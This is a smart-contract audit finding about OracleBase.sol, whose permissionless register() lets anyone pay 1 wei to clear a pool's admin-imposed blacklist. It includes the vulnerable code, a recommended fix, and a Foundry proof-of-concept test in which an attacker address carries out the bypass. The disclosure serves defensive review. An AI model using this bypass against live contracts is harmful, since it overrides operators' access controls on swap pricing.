### Title
Permissionless `register()` Allows Any Third Party to Clear a Blacklisted Pool's Oracle Access — (`File: smart-contracts-poc/contracts/oracles/providers/OracleBase.sol`)

---

### Summary

`OracleBase.register()` is fully permissionless and unconditionally clears the blacklist flag for any valid pool when called with the registration fee (default: 1 wei). Any third party — not the pool, not the admin — can pay 1 wei to instantly restore oracle-read access for a pool the admin deliberately blacklisted, nullifying the only runtime abuse-protection gate that guards live swap pricing.

---

### Finding Description

The oracle's abuse-protection model rests on a single invariant: a blacklisted pool cannot call `oracle.price(feedId, pool)` and therefore cannot execute swaps that depend on the oracle price. The admin enforces this by calling `setBlacklist(pool, true)`.

However, `register()` is declared `external payable` with no caller restriction:

```solidity
// OracleBase.sol lines 201-214
function register(bytes32 feedId, address pool, address factory) external payable {
    require(msg.value >= registrationFee, ...);   // default: 1 wei
    require(pool != address(0));
    require(approvedFactories.contains(factory), ...);
    require(IPoolFactory(factory).isPool(pool), ...);

    if (blacklisted[pool]) {
        blacklisted[pool] = false;          // ← unconditional blacklist clear
        emit BlacklistUpdated(pool, false);
    }

    registeredPool[feedId][pool] = true;
    emit PoolRegistered(feedId, pool, msg.sender, msg.value);
}
```

The only preconditions are: (1) pay `registrationFee` (1 wei by default), (2) supply an admin-approved factory, and (3) the factory must recognise the pool via `isPool`. All three are trivially satisfiable by any EOA for any previously-registered pool, because the factory and pool are already on-chain and the fee is negligible.

The `price()` gate that enforces the blacklist:

```solidity
// OracleBase.sol lines 160-172
function price(bytes32 feedId, address pool) external feedExists(feedId) notBlacklisted ...{
    require(!blacklisted[pool], Blacklisted(pool));
    ...
}
```

is bypassed the moment `register()` clears `blacklisted[pool]`.

The codebase's own test suite confirms this is reachable and succeeds:

```solidity
// test/oracles/OracleBaseAbuseProtection.t.sol lines 467-487
function test_register_thirdParty_redeems_andEnablesRead() public {
    oracle.setBlacklist(pool, true);
    vm.prank(thirdParty);
    oracle.register{value: 1}(FEED, pool, address(factory)); // 1 wei
    assertFalse(oracle.blacklisted(pool));   // blacklist cleared
    // oracle.price(FEED, pool) now succeeds
}
```

---

### Impact Explanation

The blacklist is the oracle's sole runtime mechanism to revoke a pool's access to live price data. Once a pool is blacklisted, every swap on that pool reverts at `oracle.price()` with `Blacklisted`. An adversary (or the pool operator themselves acting through a different EOA) can pay 1 wei to immediately restore oracle access, making the admin's blacklist decision completely ineffective. This is a direct admin-boundary break: an unprivileged path overrides an explicit admin access-control decision on the oracle read gate that every live swap depends on.

---

### Likelihood Explanation

The attack requires only 1 wei and knowledge of the pool address and an approved factory address — both are public on-chain. No signature, no privileged role, no special setup. Any EOA can execute it in a single transaction immediately after the admin blacklists a pool. The `registrationFee` can be raised by the admin, but even at a higher fee the bypass remains structurally available to any funded EOA; the fee does not gate the blacklist-clearing side-effect on the caller's identity.

---

### Recommendation

Separate the blacklist-clearing redemption path from the permissionless registration path. Two options:

1. **Restrict blacklist clearing to the pool itself or the admin only.** Add a caller check before clearing the flag:
   ```solidity
   if (blacklisted[pool]) {
       require(msg.sender == pool || hasRole(ADMIN_ROLE, msg.sender), Blacklisted(pool));
       blacklisted[pool] = false;
       emit BlacklistUpdated(pool, false);
   }
   ```

2. **Provide a separate `redeem(pool)` function** callable only by the pool (or its designated operator) that clears the blacklist after paying the fee, keeping `register()` as a pure whitelist-only call that never touches the blacklist.

Either option preserves the economic deterrent while ensuring only the pool that was penalised — not an arbitrary third party — can lift the penalty.

### Proof of Concept

```solidity
// Demonstrates that any third party can clear a blacklisted pool's oracle access
// for 1 wei, immediately after the admin blacklists it.

contract BlacklistBypassTest is Test {
    OracleBase oracle;
    MockPoolFactory factory;
    address pool;
    address priceProvider;
    bytes32 feedId = keccak256("ETH-USD");

    function setUp() public {
        oracle = new OracleBase(address(this), 60);
        factory = new MockPoolFactory();
        oracle.addApprovedFactory(address(factory));

        pool = makeAddr("pool");
        priceProvider = makeAddr("pp");
        factory.setPool(pool, true);

        // Initial registration and data push
        oracle.register{value: 1}(feedId, pool, address(factory));
        oracle.setData(feedId, 100_000_000, 300, 0, block.timestamp);
    }

    function test_thirdPartyBypassesBlacklist() public {
        // Admin blacklists the pool (e.g., for abuse or regulatory reasons)
        oracle.setBlacklist(pool, true);
        assertTrue(oracle.blacklisted(pool));

        // Confirm pool's swap would revert
        vm.mockCall(pool, abi.encodeWithSelector(IPool.inSwap.selector), abi.encode(priceProvider));
        vm.prank(priceProvider);
        vm.expectRevert(abi.encodeWithSelector(IOffchainOracle.Blacklisted.selector, pool));
        oracle.price(feedId, pool);

        // Any third party pays 1 wei to clear the blacklist
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        oracle.register{value: 1}(feedId, pool, address(factory));

        // Blacklist is cleared — pool can read oracle prices again
        assertFalse(oracle.blacklisted(pool));
        vm.prank(priceProvider);
        (uint256 mid,,,) = oracle.price(feedId, pool); // succeeds
        assertGt(mid, 0);
    }
}
